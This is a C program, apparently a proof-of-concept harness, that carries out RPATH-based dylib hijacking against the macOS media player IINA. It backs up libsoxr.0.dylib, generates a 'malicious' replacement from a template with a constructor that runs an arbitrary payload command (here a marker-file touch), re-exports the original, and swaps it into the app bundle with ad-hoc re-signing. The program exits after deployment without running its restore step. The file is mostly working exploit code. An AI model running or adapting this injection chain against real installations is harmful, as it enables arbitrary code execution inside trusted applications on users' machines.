#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <libgen.h>

#define APP_PATH "./IINA.app"
#define TARGET_DYLIB "libsoxr.0.dylib"
#define FRAMEWORKS_PATH "./IINA.app/Contents/Frameworks"
#define TMP_WORKING_DIR "./IINA.app/Contents/Frameworks/tmp"
#define TEMPLATE_PATH "./template.c"

typedef struct {
    char dylib_path[512];
    char backup_path[512];
    char marker_file[512];
    char log_file[512];
    char malicious_dylib[512];
    char install_name[512];
    int verify_success;
} VerifyContext;

void print_header(const char *title) {
    printf("\n╔════════════════════════════════════════════════════════╗\n");
    printf("║ %-56s ║\n", title);
    printf("╚════════════════════════════════════════════════════════╝\n\n");
}

void print_step(int step, const char *description) {
    printf("[*] Step %d: %s\n", step, description);
}

void print_success(const char *message) {
    printf("   [✓] %s\n", message);
}

void print_error(const char *message) {
    printf("   [!] %s\n", message);
    exit(1);
}

/**
 * Create working directory structure
 */
int create_working_directory(void) {
    // Create tmp directory inside app bundle
    if (mkdir(TMP_WORKING_DIR, 0755) != 0) {
        // Directory might already exist, try to remove old files
        system("rm -rf " TMP_WORKING_DIR "/*");
    }

    if (access(TMP_WORKING_DIR, F_OK) != 0) {
        print_error("Failed to create working directory");
        return 0;
    }

    print_success("Working directory created");
    return 1;
}

/**
 * Step 1: Backup original dylib to Frameworks/tmp
 */
int backup_original_dylib(VerifyContext *ctx) {
    char cmd[512];

    // Check if original exists
    if (access(ctx->dylib_path, F_OK) != 0) {
        char error_msg[256];
        snprintf(error_msg, sizeof(error_msg), "Original dylib not found: %s", ctx->dylib_path);
        print_error(error_msg);
        return 0;
    }

    // Copy dylib
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s'",
             ctx->dylib_path, ctx->backup_path);

    if (system(cmd) != 0) {
        print_error("Failed to backup dylib");
        return 0;
    }

    printf("   [✓] Backup created: %s\n", ctx->backup_path);

    // Update backup dylib's install_name to point to tmp location
    printf("   [*] Setting backup dylib install_name...\n");
    snprintf(cmd, sizeof(cmd), "install_name_tool -id '@rpath/tmp/%s' '%s/%s' 2>&1", 
            TARGET_DYLIB, TMP_WORKING_DIR, TARGET_DYLIB);
    printf("   [*] 명령: %s\n", cmd);

    if (system(cmd) == 0) {
        printf("   [✓] Backup install_name set to: @rpath/tmp/%s\n", TARGET_DYLIB);
    } else {
        printf("   [!] Failed to update backup install_name\n");
    }
    
    // 코드 서명 재설정
    printf("   [*] 코드 서명 재설정\n");
    char codesign_cmd[1024];
    snprintf(codesign_cmd, sizeof(codesign_cmd), "codesign -f -s - '%s/%s' 2>&1", TMP_WORKING_DIR, TARGET_DYLIB);
    
    int ret = system(codesign_cmd);
    if (ret == 0) {
        printf("   [✓] 코드 서명 완료\n");
    } else {
        printf("   [WARNING] 코드 서명 실패\n");
    }
    
    // 파일 정보 확인
    char file_cmd[1024];
    snprintf(file_cmd, sizeof(file_cmd), "ls -lh '%s/%s' && otool -L '%s/%s' | head -3", TMP_WORKING_DIR, TARGET_DYLIB, TMP_WORKING_DIR, TARGET_DYLIB);
    printf("   [*] 백업 dylib 정보:\n");
    system(file_cmd);

    return 1;
}

/**
 * Step 2: Determine install_name
 */
int determine_install_name(VerifyContext *ctx) {
    char cmd[512];
    FILE *fp;
    char line[256];

    printf("   [*] Detecting original install_name...\n");

    // Get install_name using otool -D
    snprintf(cmd, sizeof(cmd), "otool -D '%s' | tail -1", ctx->dylib_path);
    fp = popen(cmd, "r");
    if (!fp) {
        print_error("Failed to run otool");
        return 0;
    }

    if (fgets(line, sizeof(line), fp) != NULL) {
        // Remove newline
        line[strcspn(line, "\n")] = 0;

        // Set install_name to @rpath/libsoxr.0.dylib
        snprintf(ctx->install_name, sizeof(ctx->install_name),
                "@rpath/%s", TARGET_DYLIB);

        printf("   [*] Original install_name: %s\n", line);
        printf("   [✓] New install_name: %s\n", ctx->install_name);
    } else {
        pclose(fp);
        print_error("Failed to read install_name");
        return 0;
    }

    pclose(fp);
    return 1;
}

/**
 * Step 3: Generate malicious dylib from template
 */
int generate_malicious_dylib(VerifyContext *ctx) {
    FILE *template_fp, *output_fp;
    char template_content[65536] = {0};
    char replaced_content[65536] = {0};
    size_t total_read = 0;
    int ch;

    printf("   [*] Generating from template: %s\n", TEMPLATE_PATH);

    // Read template
    template_fp = fopen(TEMPLATE_PATH, "r");
    if (!template_fp) {
        print_error("Failed to open template file");
        return 0;
    }

    while ((ch = fgetc(template_fp)) != EOF && total_read < sizeof(template_content) - 1) {
        template_content[total_read++] = ch;
    }
    template_content[total_read] = '\0';
    fclose(template_fp);

    if (total_read == 0) {
        print_error("Template file is empty");
        return 0;
    }

    // Replace placeholders
    char payload_cmd[512];
    snprintf(payload_cmd, sizeof(payload_cmd), "touch %s", ctx->marker_file);

    const char *src = template_content;
    char *dst = replaced_content;
    size_t dst_remaining = sizeof(replaced_content) - 1;

    while (*src && dst_remaining > 0) {
        if (strstr(src, "{{DYLIB_NAME}}") == src) {
            size_t len = strlen(TARGET_DYLIB);
            if (len > dst_remaining) {
                print_error("Output buffer insufficient");
                return 0;
            }
            strcpy(dst, TARGET_DYLIB);
            dst += len;
            dst_remaining -= len;
            src += strlen("{{DYLIB_NAME}}");
        }
        else if (strstr(src, "{{PAYLOAD_COMMAND}}") == src) {
            size_t len = strlen(payload_cmd);
            if (len > dst_remaining) {
                print_error("Output buffer insufficient");
                return 0;
            }
            strcpy(dst, payload_cmd);
            dst += len;
            dst_remaining -= len;
            src += strlen("{{PAYLOAD_COMMAND}}");
        }
        else {
            *dst++ = *src++;
            dst_remaining--;
        }
    }
    *dst = '\0';

    // Write generated source
    output_fp = fopen("malicious_libsoxr.c", "w");
    if (!output_fp) {
        print_error("Failed to create malicious_libsoxr.c");
        return 0;
    }
    fputs(replaced_content, output_fp);

    // Append log function
    fprintf(output_fp, "\nvoid log_type_a_attack(void) __attribute__((constructor));\n");
    fprintf(output_fp, "void log_type_a_attack(void) {\n");
    fprintf(output_fp, "    FILE *log = fopen(\"%s\", \"a\");\n", ctx->log_file);
    fprintf(output_fp, "    if (log) {\n");
    fprintf(output_fp, "        fprintf(log, \"[Type A Attack Success]\\n\");\n");
    fprintf(output_fp, "        fprintf(log, \"Dylib: %s\\n\");\n", TARGET_DYLIB);
    fprintf(output_fp, "        fprintf(log, \"PID: %%d\\n\", getpid());\n");
    fprintf(output_fp, "        fclose(log);\n");
    fprintf(output_fp, "    }\n");
    fprintf(output_fp, "}\n");

    fclose(output_fp);

    print_success("Malicious dylib source generated");
    return 1;
}

/**
 * Step 4: Compile dylib with reexport and install_name
 */
int compile_dylib(VerifyContext *ctx) {
    char compile_cmd[2048];
    char temp_install_name[256];
    char cmd[2048];
    int ret;

    printf("   [*] Compiling dylib...\n");
    printf("      Original backup: %s\n", ctx->backup_path);
    printf("      Install name: %s\n", ctx->install_name);

    // Use temporary install_name to allow linking with backup dylib
    snprintf(temp_install_name, sizeof(temp_install_name), "my_%s_temp", TARGET_DYLIB);
    
    // Compile with reexport
    snprintf(compile_cmd, sizeof(compile_cmd),
             "clang -fPIC -dynamiclib -undefined dynamic_lookup -framework Foundation "
             "-Wl,-install_name,%s "
             "-Wl,-reexport_library,%s/%s "
             "malicious_libsoxr.c -o '%s' 2>&1",
             temp_install_name,
             TMP_WORKING_DIR ,TARGET_DYLIB,
             ctx->malicious_dylib);

    printf("   [*] %s\n", compile_cmd);
    ret = system(compile_cmd);

    if (ret == 0) {
        printf("[✓] 컴파일 완료\n");
        
        // install_name 변경: dylib 자체의 install_name을 지정된 경로로 설정
        // -id: dylib 자체의 install_name 변경 (이게 핵심!)
        printf("\n[*] dylib install_name 변경\n");
        char install_name_tool_cmd[2048];
        snprintf(install_name_tool_cmd, sizeof(install_name_tool_cmd),
                 "install_name_tool -id '%s' './%s' 2>&1",
                 ctx->install_name, ctx->malicious_dylib);
        
        printf("   [*] 명령: %s\n", install_name_tool_cmd);
        int ret2 = system(install_name_tool_cmd);
        
        if (ret2 == 0) {
            printf("[✓] install_name 변경 완료\n");
        } else {
            printf("[WARNING] install_name 변경 실패 (반환값: %d)\n", ret2);
        }
        
        // install_name_tool이 코드 서명을 깰 수 있으므로 다시 서명
        printf("\n[*] 코드 서명\n");
        char codesign_cmd[1024];
        snprintf(codesign_cmd, sizeof(codesign_cmd),
                 "codesign -f -s - './%s' 2>&1", ctx->malicious_dylib);
        
        printf("   [*] 명령: %s\n", codesign_cmd);
        int ret3 = system(codesign_cmd);
        
        if (ret3 == 0) {
            printf("[✓] 코드 서명 완료\n");
        } else {
            printf("[WARNING] 코드 서명 실패 (반환값: %d)\n", ret3);
        }
        
        // 생성된 dylib 확인
        char verify_cmd[1024];
        snprintf(verify_cmd, sizeof(verify_cmd), "file './%s' && otool -L './%s' | head -8", ctx->malicious_dylib, ctx->malicious_dylib);
        printf("\n[*] 생성된 dylib 확인:\n");
        system(verify_cmd);
        
        return 1;
    } else {
        fprintf(stderr, "[ERROR] 컴파일 실패 (반환값: %d)\n", ret);
        return 0;
    }
    
    if (ret != 0) {
        print_error("Failed to compile malicious dylib");
        return 0;
    }

    // Verify compilation
    if (access(ctx->malicious_dylib, F_OK) != 0) {
        print_error("Compiled dylib not found");
        return 0;
    }

    print_success("Dylib compiled with reexport");
    return 1;
}

/**
 * Step 5: Deploy and sign dylib
 */
int deploy_and_sign_dylib(VerifyContext *ctx) {
    char deploy_cmd[512];
    char codesign_cmd[512];

    // Deploy malicious dylib
    snprintf(deploy_cmd, sizeof(deploy_cmd), "cp '%s' '%s'",
             ctx->malicious_dylib, ctx->dylib_path);

    if (system(deploy_cmd) != 0) {
        print_error("Failed to deploy malicious dylib");
        return 0;
    }

    printf("   [✓] Malicious dylib deployed to: %s\n", ctx->dylib_path);

    // Code signing
    printf("   [*] Code signing dylib...\n");
    snprintf(codesign_cmd, sizeof(codesign_cmd),
             "codesign -f -s - '%s' 2>&1", ctx->dylib_path);

    if (system(codesign_cmd) == 0) {
        print_success("Code signing completed");
    } else {
        printf("   [!] Code signing failed (might be SIP protected)\n");
    }

    return 1;
}

/**
 * Clean marker files before execution
 */
void clean_marker_files(VerifyContext *ctx) {
    remove(ctx->marker_file);
    remove(ctx->log_file);
}

/**
 * Execute target application
 */
int execute_target_app(void) {
    char exec_cmd[256];

    printf("   [*] Launching IINA.app (10 second timeout)...\n");
    snprintf(exec_cmd, sizeof(exec_cmd), "timeout 10s open -a '%s' 2>/dev/null", APP_PATH);

    system(exec_cmd);
    sleep(10);

    print_success("Application execution completed");
    return 1;
}

/**
 * Verify attack success
 */
int verify_attack_success(VerifyContext *ctx) {
    if (access(ctx->marker_file, F_OK) == 0) {
        printf("   [✓] Marker file found: %s\n", ctx->marker_file);
        ctx->verify_success = 1;
        return 1;
    }

    printf("   [!] Marker file NOT found: %s\n", ctx->marker_file);
    ctx->verify_success = 0;
    return 0;
}

/**
 * Restore original dylib
 */
int restore_original_dylib(VerifyContext *ctx) {
    char restore_cmd[512];

    snprintf(restore_cmd, sizeof(restore_cmd), "cp '%s' '%s'",
             ctx->backup_path, ctx->dylib_path);

    if (system(restore_cmd) != 0) {
        print_error("Failed to restore original dylib");
        return 0;
    }

    print_success("Original dylib restored");
    return 1;
}

/**
 * Print verification results
 */
void print_results(VerifyContext *ctx) {
    printf("\n");

    if (ctx->verify_success) {
        printf("╔════════════════════════════════════════════════════════╗\n");
        printf("║    ✓ TYPE A ATTACK VERIFICATION SUCCESS               ║\n");
        printf("║   Malicious dylib was successfully loaded and executed ║\n");
        printf("╚════════════════════════════════════════════════════════╝\n\n");

        printf("[*] Marker File Contents:\n");
        FILE *f = fopen(ctx->marker_file, "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                printf("   %s", line);
            }
            fclose(f);
        }
        printf("\n");

        printf("[*] Log File Contents:\n");
        f = fopen(ctx->log_file, "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                printf("   %s", line);
            }
            fclose(f);
        }
        printf("\n");
    } else {
        printf("╔════════════════════════════════════════════════════════╗\n");
        printf("║    ✗ TYPE A ATTACK VERIFICATION FAILED                ║\n");
        printf("║   Malicious dylib was NOT loaded or not executed      ║\n");
        printf("╚════════════════════════════════════════════════════════╝\n\n");
    }
}

/**
 * Cleanup temporary files
 */
void cleanup(void) {
    remove("malicious_libsoxr.c");
    remove("malicious_libsoxr.dylib");
}

/**
 * Main verification routine
 */
int main(int argc, char *argv[]) {
    VerifyContext ctx = {0};

    // Initialize paths
    snprintf(ctx.dylib_path, sizeof(ctx.dylib_path), "%s/%s", FRAMEWORKS_PATH, TARGET_DYLIB);
    snprintf(ctx.backup_path, sizeof(ctx.backup_path), "%s/%s", TMP_WORKING_DIR, TARGET_DYLIB);
    snprintf(ctx.marker_file, sizeof(ctx.marker_file), "/tmp/sc_%s.success", TARGET_DYLIB);
    snprintf(ctx.log_file, sizeof(ctx.log_file), "/tmp/sc_%s.attack.log", TARGET_DYLIB);
    snprintf(ctx.malicious_dylib, sizeof(ctx.malicious_dylib), "malicious_libsoxr.dylib");

    print_header("Type A RPATH-based Dylib Hijacking Verification");
    printf("Target App: %s\n", APP_PATH);
    printf("Target Dylib: %s\n", TARGET_DYLIB);
    printf("Working Directory: %s\n", TMP_WORKING_DIR);
    printf("\n");

    // Step 0: Create working directory
    print_step(0, "Creating working directory structure");
    if (!create_working_directory()) return 1;
    printf("\n");

    // Step 1: Backup original dylib
    print_step(1, "Backing up original dylib to Frameworks/tmp");
    if (!backup_original_dylib(&ctx)) return 1;
    printf("\n");

    // Step 2: Determine install_name
    print_step(2, "Determining install_name");
    if (!determine_install_name(&ctx)) return 1;
    printf("\n");

    // Step 3: Generate malicious dylib
    print_step(3, "Generating malicious dylib source");
    if (!generate_malicious_dylib(&ctx)) return 1;
    printf("\n");

    // Step 4: Compile dylib
    print_step(4, "Compiling dylib with reexport and install_name");
    if (!compile_dylib(&ctx)) return 1;
    printf("\n");

    // Step 5: Deploy and sign
    print_step(5, "Deploying and signing malicious dylib");
    if (!deploy_and_sign_dylib(&ctx)) return 1;
    printf("\n");

    // Step 6: Clean marker files
    print_step(6, "Cleaning previous marker files");
    clean_marker_files(&ctx);
    print_success("Marker files cleaned");
    printf("\n");
    
    printf("[*] Injection completed...");
    
    return 0;
}
